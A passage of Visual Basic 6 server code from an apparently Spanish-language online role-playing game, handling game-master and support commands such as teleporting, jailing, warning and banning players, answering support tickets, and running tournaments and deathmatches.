UserList(Userindex).Stats.Reputacion = UserList(Userindex).Stats.Reputacion + 200
Call SendUserREP(Userindex)
UserList(Userindex).Faccion.Quests = UserList(Userindex).Faccion.Quests + 1
Call SendData(ToAll, Userindex, 0, "||Deathmatch> Gana " & UserList(Userindex).Name & " recibe " & PonerPuntos(OroDeLosInscriptos) & " monedas de oro, +200 puntos de reputación y 1 punto de quest. " & FONTTYPE_PARTY)
Call sacarbodydeath(Userindex)
Call SendData(ToIndex, Userindex, 0, "GANADORE")
UserList(Userindex).flags.death = False
terminodeat = False
deathesp = False
deathac = False
Cantidaddeath = 0
OroDeLosInscriptos = 0
InscripcionCosto = 100000
End If
End If
Exit Sub
End If

'SOPORTEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
If UserList(Userindex).flags.Privilegios < 1 Then Exit Sub 'SOPORTEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
'SOPORTEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
If UCase$(rdata) = "/DAMESOS" Then
Dim LstU As String
    If SoporteS.Count = 0 Then
        Call SendData(ToIndex, Userindex, 0, "||No hay soportes para ver." & FONTTYPE_INFO)
        Exit Sub
    End If
    For i = 1 To SoporteS.Count
        LstU = LstU & "@" & SoporteS.Item(i)
        Debug.Print SoporteS.Item(i)
        DoEvents
    Next i
    LstU = SoporteS.Count & LstU
    LstU = "SHWSOP@" & LstU
    Call SendData(ToIndex, Userindex, 0, LstU)
End If
 
If UCase$(Left$(rdata, 7)) = "/BORSO " Then
rdata = Right$(rdata, Len(rdata) - 7)
Call WriteVar(CharPath & UCase$(rdata) & ".chr", "STATS ", "Soporte", "")
Call WriteVar(CharPath & UCase$(rdata) & ".chr", "STATS ", "Respuesta", "")
For i = 1 To SoporteS.Count
If UCase$(SoporteS.Item(i)) = UCase$(rdata) Then
    SoporteS.Remove (i)
    Exit For
End If
DoEvents
Next i
Call SendData(ToIndex, Userindex, 0, "||Soporte y respuesta borrados con éxito" & FONTTYPE_INFO)
Exit Sub
End If
 
If UCase$(Left$(rdata, 7)) = "/SOSDE " Then
rdata = Right$(rdata, Len(rdata) - 7)
Dim SosDe As String
SosDe = GetVar(CharPath & UCase$(rdata) & ".chr", "STATS", "Soporte")
    If Len(SosDe) > 0 Then
        Call SendData(ToIndex, Userindex, 0, "SOPODE" & SosDe)
    Else
        Call SendData(ToIndex, Userindex, 0, "||Error. Soporte no encontrado" & FONTTYPE_INFO)
    End If
End If
 
If UCase$(Left$(rdata, 7)) = "/RESOS " Then
rdata = Right$(rdata, Len(rdata) - 7)
Dim Persona, Respuesta As String
Dim Pregunta As String
Persona = ReadField$(1, rdata, Asc(";"))
Respuesta = Replace(ReadField$(2, rdata, Asc(";")), Chr$(13) & Chr$(10), Chr(32))
Pregunta = GetVar(CharPath & UCase$(Persona) & ".chr", "STATS", "Soporte")

If Len(Persona) = 0 Or Len(Respuesta) = 0 Then
    Call SendData(ToIndex, Userindex, 0, "||Error en la respuesta" & FONTTYPE_INFO)
    Exit Sub
End If
Call WriteVar(CharPath & UCase$(Persona) & ".chr", "STATS", "Respuesta", Respuesta)
Call WriteVar(CharPath & UCase$(Persona) & ".chr", "STATS", "Soporte", GetVar(CharPath & UCase$(Persona) & ".chr", "STATS", "Soporte") & "0k1")
Tindex = NameIndex(Persona)
If Tindex > 0 Then
    Call SendData(ToIndex, Tindex, 0, "||Tu soporte ha sido respondido." & FONTTYPE_FENIX)
    Call SendData(ToIndex, Tindex, 0, "TENSO")
    Call SendData(ToIndex, Tindex, 0, "TW125")
End If
Call SendData(ToIndex, Userindex, 0, "||Soporte respondido con éxito" & FONTTYPE_INFO)
    For i = 1 To SoporteS.Count
    Debug.Print SoporteS.Item(1)
        If UCase$(SoporteS.Item(i)) = UCase$(Persona) Then
            SoporteS.Remove (i)
            Exit For
        End If
        DoEvents
    Next i
    
   Call LogSoportes(UserList(Userindex).Name, "(" & Persona & ") PREGUNTO: " & Pregunta, False)
   Call LogSoportes(UserList(Userindex).Name, "(" & UserList(Userindex).Name & ") RESPONDIO:" & Respuesta, False)
            
Exit Sub
End If

If UCase$(Left$(rdata, 6)) = "/INFO " Then
    Call LogGM(UserList(Userindex).Name, rdata, False)
    rdata = Right$(rdata, Len(rdata) - 6)
    Tindex = NameIndex(rdata)
    If Tindex <= 0 Then Exit Sub
    If UserList(Tindex).flags.Privilegios > UserList(Userindex).flags.Privilegios Then Exit Sub
    SendUserSTAtsTxt Userindex, Tindex
    Call SendData(ToIndex, Userindex, 0, "||MAC: " & UserList(Tindex).Mac & FONTTYPE_INFO)
    Call SendData(ToIndex, Userindex, 0, "||HD: " & UserList(Tindex).HDDisck & FONTTYPE_INFO)
    Call SendData(ToIndex, Userindex, 0, "||MOTHER: " & UserList(Tindex).MotherNumber & FONTTYPE_INFO)
    Call SendData(ToIndex, Userindex, 0, "||Ip: " & UserList(Tindex).ip & FONTTYPE_INFO)
    Exit Sub
End If

If UCase$(Left$(rdata, 8)) = "/IPNICK " Then
    rdata = Right$(rdata, Len(rdata) - 8)
    tStr = ""
    For loopc = 1 To LastUser
        If UserList(loopc).ip = rdata And Len(UserList(loopc).Name) > 0 And UserList(loopc).flags.UserLogged Then
            If (UserList(Userindex).flags.Privilegios > 0 And UserList(loopc).flags.Privilegios = 0) Or (UserList(Userindex).flags.Privilegios = 3) Or (UserList(Userindex).flags.Privilegios = 4) Then
                tStr = tStr & UserList(loopc).Name & ", "
            End If
        End If
    Next
    Call SendData(ToIndex, Userindex, 0, "||Los personajes con ip " & rdata & " son: " & tStr & FONTTYPE_HORA)
    Exit Sub
End If

If UCase$(Left$(rdata, 5)) = "/INV " Then
    Call LogGM(UserList(Userindex).Name, rdata, False)
    rdata = Right$(rdata, Len(rdata) - 5)
    Tindex = NameIndex(rdata)
    If Tindex <= 0 Then Exit Sub
    If UserList(Tindex).flags.Privilegios > UserList(Userindex).flags.Privilegios Then Exit Sub
    SendUserInvTxt Userindex, Tindex
    Exit Sub
End If

If UCase$(Left$(rdata, 7)) = "/TELEP " Then
    rdata = Right$(rdata, Len(rdata) - 7)
    Mapa = val(ReadField(2, rdata, 32))
    If Not MapaValido(Mapa) Then Exit Sub
    Name = ReadField(1, rdata, 32)
    If Len(Name) = 0 Then Exit Sub
    If UCase$(Name) <> "YO" Then
        If UserList(Userindex).flags.Privilegios = 1 Then
            Exit Sub
        End If
        Tindex = NameIndex(Name)
    Else
        Tindex = Userindex
    End If
    X = val(ReadField(3, rdata, 32))
    y = val(ReadField(4, rdata, 32))
    If Not InMapBounds(X, y) Then Exit Sub
    If Tindex <= 0 Then
         Call SendData(ToIndex, Userindex, 0, "1A") 'offline na
         Exit Sub
    End If
    If UserList(Tindex).flags.Privilegios > UserList(Userindex).flags.Privilegios Then
        Call SendData(ToIndex, Userindex, 0, "1A")
        Exit Sub
    End If
     If UserList(Tindex).POS.Map = Prision.Map Then
    Call SendData(ToIndex, Userindex, 0, "||El usuario esta en carcel." & FONTTYPE_INFO)
    Exit Sub
    End If
    Call WarpUserChar(Tindex, Mapa, X, y, True)
    Call SendData(ToIndex, Tindex, 0, "||" & UserList(Userindex).Name & " te ha transportado." & FONTTYPE_INFO)
    Call LogGM(UserList(Userindex).Name, "Transporto a " & UserList(Tindex).Name & " hacia " & "Mapa" & Mapa & " X:" & X & " Y:" & y, (UserList(Userindex).flags.Privilegios = 1))
    Exit Sub
End If

If UCase$(Left$(rdata, 9)) = "/TELEOFF " Then
    rdata = Right$(rdata, Len(rdata) - 9)
    Mapa = val(ReadField(2, rdata, 32))
    If Not MapaValido(Mapa) Then Exit Sub
    X = val(ReadField(3, rdata, 32))
    y = val(ReadField(4, rdata, 32))
    If Not InMapBounds(X, y) Then Exit Sub
    tStr = Replace$(ReadField(1, rdata, 32), "+", " ")
    If FileExist(CharPath & tStr & ".chr", vbNormal) = True Then
    Call WriteVar(CharPath & tStr & ".chr", "INIT", "Position", Mapa & "-" & X & "-" & y)
    Call SendData(ToIndex, Userindex, 0, "||Has cambiado a " & tStr & ".chr de posicion a " & Mapa & "-" & X & "-" & y & ". (offline)" & FONTTYPE_GUILD)
    Call LogGM(UserList(Userindex).Name, "Transporto a " & tStr & " hacia " & "Mapa" & Mapa & " X:" & X & " Y:" & y, (UserList(Userindex).flags.Privilegios = 1))
    End If
    Exit Sub
End If

If UCase$(Left$(rdata, 4)) = "/GO " Then
    rdata = Right$(rdata, Len(rdata) - 4)
    Mapa = val(ReadField(1, rdata, 32))
    If Not MapaValido(Mapa) Then Exit Sub
    Call WarpUserChar(Userindex, Mapa, 50, 50, True)
    Call SendData(ToIndex, Userindex, 0, "2B" & UserList(Userindex).Name)
    Call LogGM(UserList(Userindex).Name, "Transporto a " & UserList(Userindex).Name & " hacia " & "Mapa" & Mapa & " X:" & X & " Y:" & y, (UserList(Userindex).flags.Privilegios = 1))
    Exit Sub
End If

If UCase$(rdata) = "/ONLINEGM" Then
        For loopc = 1 To LastUser
            If Len(UserList(loopc).Name) > 0 Then
                If UserList(loopc).flags.Privilegios > 0 And (UserList(loopc).flags.Privilegios <= UserList(Userindex).flags.Privilegios Or UserList(loopc).flags.AdminInvisible = 0) Then
                    If UserList(loopc).flags.Privilegios > UserList(Userindex).flags.Privilegios Then
                    tStr = tStr & UserList(loopc).Name & ", "
                    End If
                End If
            End If
        Next
        If Len(tStr) > 0 Then
            tStr = Left$(tStr, Len(tStr) - 2)
            Call SendData(ToIndex, Userindex, 0, "||" & tStr & FONTTYPE_HORA)
        Else
            Call SendData(ToIndex, Userindex, 0, "%P")
        End If
        Exit Sub
End If

If UCase$(rdata) = "/INVISIBLE" Then
    Call DoAdminInvisible(Userindex)
    Call LogGM(UserList(Userindex).Name, "/INVISIBLE", (UserList(Userindex).flags.Privilegios = 1))
    Exit Sub
End If

If UCase$(rdata) = "/TELEPLOC" Then
    Call WarpUserChar(Userindex, UserList(Userindex).flags.TargetMap, UserList(Userindex).flags.TargetX, UserList(Userindex).flags.TargetY, True)
    Call LogGM(UserList(Userindex).Name, "/TELEPLOC a x:" & UserList(Userindex).flags.TargetX & " Y:" & UserList(Userindex).flags.TargetY & " Map:" & UserList(Userindex).POS.Map, (UserList(Userindex).flags.Privilegios = 1))
    Exit Sub
End If

'########################## GUERRACLAN by GALLE ########################
If UCase$(Left$(rdata, 8)) = "/ACTCLAN" Then
   If UserList(Userindex).flags.Privilegios = 0 Then Exit Sub
   
   If cACT = True Then
      cACT = False
      Call SendData(ToAll, 0, 0, "||Los reto de clanes fueron activados." & FONTTYPE_FENIX)
   Else
      Clan1CUP = 0
      Clan2CUP = 0
      Clan1CUPRONDAS = 0
      Clan2CUPRONDAS = 0
      cACT = True
      cOCUP = False
      RetoClan.lider1 = 0
      RetoClan.lider2 = 0
         Dim LoopCla As Integer
               For LoopCla = 1 To LastUser
                  If UserList(LoopCla).flags.enRetoC1 Or UserList(LoopCla).flags.enRetoC2 Then
                     Call WarpUserChar(LoopCla, 1, 50, 50)
                     UserList(LoopCla).flags.enRetoC1 = False
                     UserList(LoopCla).flags.enRetoC2 = False
                     UserList(LoopCla).flags.RecRetoC = False
                     UserList(LoopCla).flags.EnvRetoC = False
                     UserList(LoopCla).flags.DesafGuerra = False
                 End If
               Next LoopCla
 
      Call SendData(ToAll, 0, 0, "||Los reto de clanes fueron desactivado" & FONTTYPE_FENIX)
   End If
Exit Sub
End If
'########################## GUERRACLAN by GALLE ########################


If UCase$(Left$(rdata, 5)) = "/SUM " Then
    rdata = Right$(rdata, Len(rdata) - 5)
    Tindex = NameIndex(rdata)
    
    If Tindex <= 0 Then Exit Sub
    If UserList(Tindex).flags.Privilegios > UserList(Userindex).flags.Privilegios Then Exit Sub
    
    If UserList(Userindex).flags.Privilegios < UserList(Tindex).flags.Privilegios And UserList(Tindex).flags.AdminInvisible = 1 Then
        Call SendData(ToIndex, Userindex, 0, "1A")
        Exit Sub
    End If
    
     If UserList(Tindex).POS.Map = Prision.Map Then
    Call SendData(ToIndex, Userindex, 0, "||El usuario esta en carcel." & FONTTYPE_INFO)
    Exit Sub
    End If
    If UserList(Userindex).flags.Privilegios = 0 And UserList(Tindex).POS.Map <> UserList(Userindex).POS.Map Then Exit Sub
    Call SendData(ToIndex, Userindex, 0, "%Z" & UserList(Tindex).Name)
    Call WarpUserChar(Tindex, UserList(Userindex).POS.Map, UserList(Userindex).POS.X, UserList(Userindex).POS.y + 1, True)
    Call LogGM(UserList(Userindex).Name, "/SUM " & UserList(Tindex).Name & " Map:" & UserList(Userindex).POS.Map & " X:" & UserList(Userindex).POS.X & " Y:" & UserList(Userindex).POS.y, False)
    Exit Sub
End If

If UCase$(Left$(rdata, 5)) = "/IRA " Then
    rdata = Right$(rdata, Len(rdata) - 5)
    Tindex = NameIndex(rdata)
    If Tindex <= 0 Then Exit Sub
    If UserList(Tindex).flags.Privilegios > UserList(Userindex).flags.Privilegios Then Exit Sub
    If ((UserList(Tindex).flags.Privilegios > UserList(Userindex).flags.Privilegios And UserList(Tindex).flags.AdminInvisible = 1)) Then
        Call SendData(ToIndex, Userindex, 0, "1A")
        Exit Sub
    End If
    If UserList(Tindex).flags.AdminInvisible And Not UserList(Userindex).flags.AdminInvisible Then Call DoAdminInvisible(Userindex)
    Call WarpUserChar(Userindex, UserList(Tindex).POS.Map, UserList(Tindex).POS.X + 1, UserList(Tindex).POS.y + 1, True)
    Call LogGM(UserList(Userindex).Name, "/IRA " & UserList(Tindex).Name & " Mapa:" & UserList(Tindex).POS.Map & " X:" & UserList(Tindex).POS.X & " Y:" & UserList(Tindex).POS.y, (UserList(Userindex).flags.Privilegios = 1))
    Exit Sub
End If
'EVENTOSSSSSSSS
If UserList(Userindex).flags.Privilegios < 2 Then Exit Sub 'EVENTOSSSSSSSS
'EVENTOSSSSSSSS
If UserList(Userindex).flags.Quest Then
    If UCase$(Left$(rdata, 3)) = "/M " Then
        rdata = Right$(rdata, Len(rdata) - 3)
        If Len(rdata) = 0 Then Exit Sub
        Select Case UserList(Userindex).Faccion.Bando
            Case Real
                tStr = FONTTYPE_ARMADA
            Case Caos
                tStr = FONTTYPE_CAOS
        End Select
        Call SendData(ToAll, 0, 0, "||" & rdata & tStr)
        Exit Sub
    ElseIf UCase$(rdata) = "/TELEPLOC" Then
        Call WarpUserChar(Userindex, UserList(Userindex).flags.TargetMap, UserList(Userindex).flags.TargetX, UserList(Userindex).flags.TargetY, True)
        Exit Sub
    ElseIf UCase$(rdata) = "/TRAMPA" Then
        Call ActivarTrampa(Userindex)
        Exit Sub
    End If
End If

If UCase$(Left$(rdata, 6)) = "/RMSG " Then
rdata = Right$(rdata, Len(rdata) - 6)
If UserList(Userindex).flags.Privilegios = 0 Then Exit Sub
Call LogGM(UserList(Userindex).Name, "Mensaje Broadcast:" & rdata, False)
If rdata <> "" Then
Call SendData(ToAll, 0, 0, "|$" & UserList(Userindex).Name & "> " & rdata)
End If
Exit Sub
End If

If UCase$(Left$(rdata, 6)) = "/RVSG " Then
    rdata = Right$(rdata, Len(rdata) - 6)
    Call LogGM(UserList(Userindex).Name, "Mensaje BroadcastRV:" & rdata, False)
    If Len(rdata) > 0 Then
       Call SendData(ToAll, 0, 0, "||" & rdata & FONTTYPE_FENIZ & ENDC)
    End If
    Exit Sub
End If

If UCase$(Left$(rdata, 14)) = "/PROTECTORTHE " Then
rdata = Right$(rdata, Len(rdata) - 14)
pProtector = CInt(rdata)
Call LogGM(UserList(Userindex).Name, "Abrio cupos para Protector modalidad " & pProtector & " Vs. " & pProtector & ".", False)
Call AbreCuposProtector
Exit Sub
End If

If UCase$(rdata) = "/ZKGJX" Then
Call cancelaProtector
Call LogGM(UserList(Userindex).Name, "Cancelo Protector.", False)
End If



If UCase$(Left$(rdata, 9)) = "/TEAMTHE " Then
rdata = Right$(rdata, Len(rdata) - 9)
ptheteam = CInt(rdata)
Call LogGM(UserList(Userindex).Name, "Abrio cupos para The Team modalidad " & ptheteam & " Vs. " & ptheteam & ".", False)
Call AbreCuposTheteam
Exit Sub
End If

If UCase$(rdata) = "/UKGJX" Then
Call cancelatheteam
Call LogGM(UserList(Userindex).Name, "Cancelo The Team.", False)
End If
    
If UCase$(Left$(rdata, 9)) = "/DENOCHE " Then
rdata = Right$(rdata, Len(rdata) - 9)

If rdata = 1 Then
            AutomaticoCanjes = 1
            AutomaticoCanjesp = 1
            Call SendData(ToAdmins, 0, 0, "||Admin's: Torneos 1vs1 y plantes (sin canjes)" & FONTTYPE_gms)
        End If
If rdata = 2 Then
            AutomaticoCanjes = 0
            AutomaticoCanjesp = 0
            Call SendData(ToAdmins, 0, 0, "||Admin's: Torneos 1vs1 y plantes (con canjes)" & FONTTYPE_gms)
        End If
If rdata = 3 Then
            AutomaticoTheTeam = 1
            ProtectorCanjes = 1
            Call SendData(ToAdmins, 0, 0, "||Admin's: The team - Protector - Capture (sin canjes)" & FONTTYPE_gms)
        End If
If rdata = 4 Then
            AutomaticoTheTeam = 0
            ProtectorCanjes = 0
            Call SendData(ToAdmins, 0, 0, "||Admin's: The team - Protector - Capture (con canjes)" & FONTTYPE_gms)
        End If
        Exit Sub
    End If

If UCase$(Left$(rdata, 9)) = "/DEATMAC " Then
rdata = Right$(rdata, Len(rdata) - 9)
Call LogGM(UserList(Userindex).Name, "Abrio un deathmatch Automático para " & rdata & " Usuarios.", False)
Dim DEATQL As Integer
DEATQL = CInt(rdata)
If (DEATQL > 0 And DEATQL < 32) Then Call death_comienza(DEATQL)
End If

If UCase(rdata) = "/DCANCELAR" Then
Call Death_Cancela
Call LogGM(UserList(Userindex).Name, "Cancelo deathmatch Automático.", False)
Exit Sub
End If

If UCase$(Left$(rdata, 10)) = "/SATUROSP " Then
rdata = Right$(rdata, Len(rdata) - 10)
Call LogGM(UserList(Userindex).Name, "Abrio un torneo Automático de plantes para " & rdata & " Usuarios.", False)
Dim torneosp As Integer
torneosp = CInt(rdata)
If rdata = 1 Then
CantAutop = 100
ElseIf rdata = 2 Then
CantAutop = 300
ElseIf rdata = 3 Then
CantAutop = 400
ElseIf rdata = 4 Then
CantAutop = 500
ElseIf rdata = 5 Then
CantAutop = 750
ElseIf rdata = 6 Then
CantAutop = 1000
End If
If (torneosp > 0 And torneosp < 6) Then Call Torneos_Iniciap(Userindex, torneosp)
End If

If UCase$(Left$(rdata, 10)) = "/PCANCELAR" Then
Call LogGM(UserList(Userindex).Name, "Cancelo torneo Automático de plantes.", False)
Call Rondas_Cancelap
Exit Sub
End If

If UCase$(Left$(rdata, 6)) = "/AUTO " Then
rdata = Right$(rdata, Len(rdata) - 6)
Call LogGM(UserList(Userindex).Name, "Abrio un torneo Automático para " & rdata & " Usuarios.", False)
Dim torneos As Integer
torneos = CInt(rdata)
If rdata = 1 Then
CantAuto = 100
ElseIf rdata = 2 Then
CantAuto = 300
ElseIf rdata = 3 Then
CantAuto = 400
ElseIf rdata = 4 Then
CantAuto = 500
ElseIf rdata = 5 Then
CantAuto = 750
ElseIf rdata = 6 Then
CantAuto = 1000
End If
If (torneos > 0 And torneos < 6) Then Call Torneos_Inicia(Userindex, torneos)
End If

If UCase$(Left$(rdata, 9)) = "/INSCROP " Then
rdata = Right$(rdata, Len(rdata) - 9)
InscripcionCosto = rdata
Call SendData(ToAll, 0, 0, "||Inscripción de eventos cambiada a: " & PonerPuntos(InscripcionCosto) & "." & FONTTYPE_TALK)
Exit Sub
End If

If UCase$(Left$(rdata, 9)) = "/CANCELAR" Then
Call LogGM(UserList(Userindex).Name, "Cancelo torneo Automático.", False)
Call Rondas_Cancela
Exit Sub
End If

If UCase$(Left$(rdata, 9)) = "/AUTO2V2 " Then
rdata = Right$(rdata, Len(rdata) - 9)
Call LogGM(UserList(Userindex).Name, "Abrio un torneo Automático 2vs2 para " & rdata & " parejas.", False)
torneos = CInt(rdata)
If rdata = 1 Then
CantAuto = 100
ElseIf rdata = 2 Then
CantAuto = 300
ElseIf rdata = 3 Then
CantAuto = 400
ElseIf rdata = 4 Then
CantAuto = 500
ElseIf rdata = 5 Then
CantAuto = 750
ElseIf rdata = 6 Then
CantAuto = 1000
End If
If (torneos > 0 And torneos < 6) Then Call Torneos_Inicia2vs2(Userindex, torneos)
End If

If UCase$(Left$(rdata, 11)) = "/CANCELA2V2" Then
Call LogGM(UserList(Userindex).Name, "Cancelo torneo Automático 2vs2.", False)
Call Rondas_Cancela2vs2
Exit Sub
End If


If UCase$(Left$(rdata, 8)) = "/TORNEO " Then
    rdata = Right$(rdata, Len(rdata) - 8)
    PTorneo = val(ReadField(1, rdata, 32))
    If entorneo = 0 Then
        entorneo = 1
        If FileExist(App.Path & "/logs/torneo.log", vbNormal) Then Kill (App.Path & "/logs/torneo.log")
        Call SendData(ToIndex, Userindex, 0, "||Has activado el torneo" & FONTTYPE_INFO)
        Call SendData(ToAll, 0, 0, "||Torneo para " & PTorneo & " jugadores. Para ingresar /PARTICIPAR." & FONTTYPE_TALK)
    Else
        entorneo = 0
        Call SendData(ToIndex, Userindex, 0, "||Has desactivado el torneo" & FONTTYPE_INFO)
        Puesto = 0
        Call SendData(ToAll, 0, 0, "||Cupos cerrados." & FONTTYPE_TALK)
    End If
    Exit Sub
End If

If UCase$(Left$(rdata, 14)) = "/CARCELTIEMPO " Then
    rdata = Right$(rdata, Len(rdata) - 14)
   arg1 = ReadField(1, rdata, 64)
    Name = ReadField(2, rdata, 64)
    i = val(ReadField(3, rdata, 64))
   If Len(arg1) = 0 Or Len(Name) = 0 Or i = 0 Then
     Call SendData(ToIndex, Userindex, 0, "||La estructura del comando es /CARCELTIEMPO CAUSA@NICK@MINUTOS." & FONTTYPE_FENIX)
     Exit Sub
    End If
    Tindex = NameIndex(Name)
    If Tindex <= 0 Then
        Call SendData(ToIndex, Userindex, 0, "1A")
        Exit Sub
    End If
    If UserList(Tindex).flags.Privilegios > UserList(Userindex).flags.Privilegios Then
        Call SendData(ToIndex, Userindex, 0, "1B")
        Exit Sub
    End If
    If i > 120 Then
       Call SendData(ToIndex, Userindex, 0, "1C")
        Exit Sub
    End If
UserList(Tindex).Counters.TiempoPena = 60 * i
UserList(Tindex).flags.Encarcelado = 1
UserList(Tindex).Counters.Pena = Timer
Call WarpUserChar(Tindex, Prision.Map, Prision.X, Prision.y, True)
Call SendData(ToIndex, Tindex, 0, "||" & "Has sido encarcelado por " & arg1 & " durante los próximos " & i & " minutos." & " GM: " & UserList(Userindex).Name & FONTTYPE_BLANCO)
Call SendData(ToAdmins, 0, 0, "||" & UserList(Userindex).Name & " Encarcelo a " & UserList(Tindex).Name & " por " & arg1 & " durante los próximos " & i & " minutos." & FONTTYPE_FENIX)
Call LogGM(UserList(Userindex).Name, "/CARCELTIEMPO a " & UserList(Tindex).Name & " por " & arg1 & " durante los próximos " & i & " minutos.", (UserList(Userindex).flags.Privilegios = 1))
    Exit Sub
End If

If UCase$(Left$(rdata, 13)) = "/ENVENCUESTA " Then
    If encuestas.activa = 1 Then Call SendData(ToIndex, Userindex, 0, "||Ya hay una encuesta, espera a que termine.." & FONTTYPE_INFO)
    rdata = Right$(rdata, Len(rdata) - 13)
    encuestas.votosNP = 0
    encuestas.votosSI = 0
    encuestas.tiempo = 0
    encuestas.activa = 1
    Call SendData(ToAll, 0, 0, "||ENCUESTA> " & rdata & FONTTYPE_RETOS1vS1)
    Call SendData(ToAll, 0, 0, "||OPCIONES: /VOTSI - /VOTNO | La encuesta durará 30 segundos." & FONTTYPE_RETOS1vS1)
    Exit Sub
End If

If UCase$(rdata) = "/PANELGM" Then
    Call SendData(ToIndex, Userindex, 0, "GMERXE")
    Call PanelGmListUser(Userindex)
End If

If UCase$(Left$(rdata, 5)) = "/HORA" Then
    Call LogGM(UserList(Userindex).Name, "Hora.", (UserList(Userindex).flags.Privilegios = 1))
    rdata = Right$(rdata, Len(rdata) - 5)
    Call SendData(ToAll, 0, 0, "||Hora: " & Time & " " & Date & FONTTYPE_HORA)
    Exit Sub
End If

If UCase$(Left$(rdata, 9)) = "/EXPLOTA " Then
rdata = Right$(rdata, Len(rdata) - 9)
Tindex = NameIndex(rdata)
If Tindex Then
Call WarpUserChar(Tindex, 86, 50, 50, True)
Call UserDie(Tindex)
Call WarpUserChar(Tindex, 1, 50, 50, True)
Else
Call SendData(ToIndex, Userindex, 0, "||El usuario " & rdata & " está offline" & FONTTYPE_BLANCO)
End If
Exit Sub
End If

If UCase$(Left$(rdata, 7)) = "/PASAN " Then
rdata = Right$(rdata, Len(rdata) - 7)
Tindex = NameIndex(rdata)
If Tindex Then
Call WarpUserChar(Tindex, 191, 50, 50, True)
Else
 Call SendData(ToIndex, Userindex, 0, "||El usuario " & rdata & " está offline" & FONTTYPE_BLANCO)
End If
Exit Sub
End If

If UCase$(Left$(rdata, 10)) = "/VERTORNEO" Then
    rdata = Right$(rdata, Len(rdata) - 10)
    Dim jugadores As Integer
    Dim jugador As Integer
    stri = ""
    jugadores = val(GetVar(App.Path & "/logs/torneo.log", "CANTIDAD", "CANTIDAD"))
    For jugador = 1 To jugadores
        stri = stri & GetVar(App.Path & "/logs/torneo.log", "JUGADORES", "JUGADOR" & jugador) & "@"
    Next
   Call SendData(ToIndex, Userindex, 0, "PPT" & " @" & stri)
    Exit Sub
End If

If UCase$(Left$(rdata, 9)) = "/REVIVIR " Then
    rdata = Right$(rdata, Len(rdata) - 9)
    Name = rdata
    If UCase$(Name) <> "YO" Then
        Tindex = NameIndex(Name)
    Else
        Tindex = Userindex
    End If
    If Tindex <= 0 Then
        Call SendData(ToIndex, Userindex, 0, "1A")
        Exit Sub
    End If
    Call RevivirUsuarioNPC(Tindex)
    Call SendData(ToIndex, Tindex, 0, "%T" & UserList(Userindex).Name)
    Call LogGM(UserList(Userindex).Name, "Resucito a " & UserList(Tindex).Name, False)
    Exit Sub
End If

If UCase$(Left$(rdata, 10)) = "/ADVERTIR " Then
    rdata = Right$(rdata, Len(rdata) - 10)
    Dim minutosadvertido As Integer
   Tindex = NameIndex(rdata)
   If UserList(Tindex).flags.Privilegios > UserList(Userindex).flags.Privilegios Then Exit Sub
    
    If Tindex <= 0 Then Exit Sub
    UserList(Tindex).flags.Advertencias = UserList(Tindex).flags.Advertencias + 1
    'Call SendData(ToAll, 0, 0, "||" & UserList(Userindex).Name & " Advirtio a " & UserList(Tindex).Name & ". (lleva " & UserList(Tindex).flags.Advertencias & " advertencia)" & FONTTYPE_FIGHTT)
        Call SendData(ToIndex, Tindex, 0, "||Fuiste advertido por " & UserList(Userindex).Name & ", ya tienes " & UserList(Tindex).flags.Advertencias & " Advertencias si llegas a 5 seras baneado automáticamente." & FONTTYPE_FIGHTT)
        Call LogGM(UserList(Userindex).Name, "Advirtio a " & UserList(Tindex).Name, False)
    If UserList(Tindex).flags.Advertencias = 1 Then
    minutosadvertido = 15
    UserList(Tindex).Counters.TiempoPena = 60 * minutosadvertido
    UserList(Tindex).flags.Encarcelado = 1
    UserList(Tindex).Counters.Pena = Timer
    ElseIf UserList(Tindex).flags.Advertencias = 2 Then
    minutosadvertido = 30
    UserList(Tindex).Counters.TiempoPena = 60 * minutosadvertido
    UserList(Tindex).flags.Encarcelado = 1
    Call SendUserREP(Tindex)
    ElseIf UserList(Tindex).flags.Advertencias = 3 Then
    minutosadvertido = 45
    UserList(Tindex).Counters.TiempoPena = 60 * minutosadvertido
    UserList(Tindex).flags.Encarcelado = 1
    Call SendUserREP(Tindex)
    ElseIf UserList(Tindex).flags.Advertencias = 4 Then
    minutosadvertido = 60
    UserList(Tindex).Counters.TiempoPena = 60 * minutosadvertido
    UserList(Tindex).flags.Encarcelado = 1
    Call SendUserREP(Tindex)
    ElseIf UserList(Tindex).flags.Advertencias >= 5 Then
        Call SendData(ToAll, 0, 0, "||Servidor> " & UserList(Tindex).Name & " fue baneado por 7 días por acumulación de 5 advertencias." & FONTTYPE_FIGHTT)
            Call BanearPjTiempo(Userindex, "Acumulación de 5 advertencias.", rdata, 7) ' /BANT CAUSA@NICK@DIAS
            Call CloseSocket(Tindex)
            Exit Sub
    ElseIf UserList(Tindex).flags.Advertencias >= 6 Then
        Call SendData(ToAll, 0, 0, "||Servidor> " & UserList(Tindex).Name & " fue baneado por 15 días por acumulación de 6 advertencias." & FONTTYPE_FIGHTT)
            Call BanearPjTiempo(Userindex, "Acumulación de 6 advertencias.", rdata, 15) ' /BANT CAUSA@NICK@DIAS
            Call CloseSocket(Tindex)
            Exit Sub
    ElseIf UserList(Tindex).flags.Advertencias >= 7 Then
        Call SendData(ToAll, 0, 0, "||Servidor> " & UserList(Tindex).Name & " fue baneado por 1 mes por acumulación de 7 advertencias." & FONTTYPE_FIGHTT)
            Call BanearPjTiempo(Userindex, "Acumulación de 7 advertencias.", rdata, 30) ' /BANT CAUSA@NICK@DIAS
            Call CloseSocket(Tindex)
            Exit Sub
    ElseIf UserList(Tindex).flags.Advertencias >= 8 Then
        Call SendData(ToAll, 0, 0, "||Servidor> " & UserList(Tindex).Name & " fue baneado definitivamente por acumulación de 8 advertencias." & FONTTYPE_FIGHTT)
            UserList(Tindex).flags.Ban = 1
            Call LogBan(Tindex, Userindex, "Acumulación de 8 advertencias.")
            Call CloseSocket(Tindex)
            Exit Sub
    End If
    
    Call WarpUserChar(Tindex, Prision.Map, Prision.X, Prision.y, True)
    Call SendData(ToIndex, Tindex, 0, "||" & "Has sido encarcelado por advertencia durante los próximos " & minutosadvertido & " minutos." & " GM: " & UserList(Userindex).Name & FONTTYPE_BLANCO)
    
    Exit Sub
End If

If UCase$(Left$(rdata, 7)) = "/ECHAR " Then
    rdata = Right$(rdata, Len(rdata) - 7)
    Tindex = NameIndex(rdata)
